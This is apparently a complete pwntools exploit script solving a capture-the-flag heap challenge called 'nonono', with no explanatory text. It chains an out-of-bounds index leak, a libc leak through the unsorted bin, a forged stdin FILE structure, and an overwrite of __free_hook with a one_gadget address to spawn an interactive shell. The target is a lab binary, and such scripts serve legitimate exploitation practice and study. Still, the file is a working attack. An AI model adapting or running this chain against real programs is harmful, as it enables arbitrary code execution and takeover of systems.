#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'

onegadget = 0x4f322

def new(idx, size, content=None):
    p.sendlineafter('>> ', str(1))
    p.sendlineafter('IDX : ', str(idx))
    p.sendlineafter('SIZE : ', str(size))
    if content != None:
        p.sendafter('CONTENT: ', content)

def show(idx):
    p.sendlineafter('>> ', str(2))
    p.sendlineafter('IDX : ', str(idx))

def remove(idx):
    p.sendlineafter('>> ', str(3))
    p.sendlineafter('IDX : ', str(idx))

def take_flag():
    p.sendlineafter('>> ', str(4))

libc = ELF('./libc.so.6')
p = process('./nonono')

# Leak bss
show(-7)
bss = u64(p.recvuntil('\n', drop=True).ljust(8, b'\0')) - 8
print('bss: {:#x}'.format(bss))

# Making unsorted bin
for i in range(8):
    new(i, 0x80, b'a'*0x7f + b'\n')
new(8, 0x10, b'a'*0xf + b'\n')

for i in range(8):
    remove(i)

# Leak libc
new(0, 0)
show(0)
libc.address = u64(p.recvuntil('\n', drop=True).ljust(8, b'\0')) - 0x3ebd20
print('libc: {:#x}'.format(libc.address))

# Forge FILE structure
writehere = libc.symbols['__free_hook'] - 4
size = 14
stdin = [
    0xfbad208b,         writehere,
    writehere,          writehere,
    writehere,          writehere,
    writehere,          writehere,
    writehere+size,     0,
    0,                  0,
    0,                  0,
    0x100000000,        0xffffffffffffffff,
    0,                  libc.address + 0x3ed8d0,
    0xffffffffffffffff, 0,
    libc.address + 0x3ebae0, 0,
    0,                  0,
    0xffffffff,         0,
    0,                  libc.address + 0x3e82a0]
payload = flat(stdin)
assert b'\n' not in payload
new(1, 0xe0, payload+b'\n')
remove(1)
new(-2, 0xe0, b'\n')

# Rewrite __free_hook
new(2, 13, b'a'*4 + p64(libc.address + onegadget) + b'\n')

# Hit onegadget
remove(0)

p.interactive()
